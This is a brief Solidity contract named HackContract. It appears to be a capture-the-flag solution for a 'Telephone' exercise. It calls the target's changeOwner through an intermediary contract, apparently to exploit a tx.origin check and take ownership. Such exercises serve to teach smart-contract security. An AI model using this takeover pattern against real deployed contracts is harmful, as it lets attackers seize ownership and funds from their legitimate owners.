// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract HackContract {
    Telephone public telephone;

    constructor(Telephone _telephone) public {
        telephone = _telephone;
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
